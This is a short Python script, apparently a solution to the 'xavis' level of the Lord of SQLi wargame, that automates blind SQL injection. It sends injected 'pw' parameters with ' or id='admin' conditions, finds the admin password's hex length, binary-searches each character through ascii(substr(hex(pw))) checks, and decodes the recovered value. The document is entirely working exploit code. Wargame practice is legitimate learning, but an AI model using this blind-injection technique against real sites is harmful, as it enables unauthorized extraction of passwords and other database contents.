import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_length():
    length = 1

    while True:
        params = { "pw" : "' or id='admin' and length(hex(pw)) = {} #".format(length) }
        request = requests.get(url, params=params, cookies=cookies)

        if "Hello admin" in request.text:
            return length
        else:
            length += 1

def pw_crack():
    password_length = pw_length()
    password = ''

    for i in range(1, password_length+1):
        start, end, mid = 1, 127, 64
        while True:
            params = { "pw" : "' or id='admin' and ascii(substr(hex(pw), {}, 1))={} #".format(i, mid) }
            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                password = password + chr(int(str(mid)))
                print("패스워드:", password)
                break
            else:
                params = { "pw" : "' or id='admin' and ascii(substr(hex(pw), {}, 1))>{} #".format(i, mid) }
                request = requests.get(url, params=params, cookies=cookies)

                if "Hello admin" in request.text:
                    start = mid
                    mid = (mid + end) // 2
                else:
                    end = mid
                    mid = (start + end) // 2
    
    if len(password) == password_length: 
        correct_password = [ password[i:i+8] for i in range(0, len(password), 8) ]
        
        for i in range(len(correct_password)):
            print(chr(int(correct_password[i], 16)), end="")

pw_crack()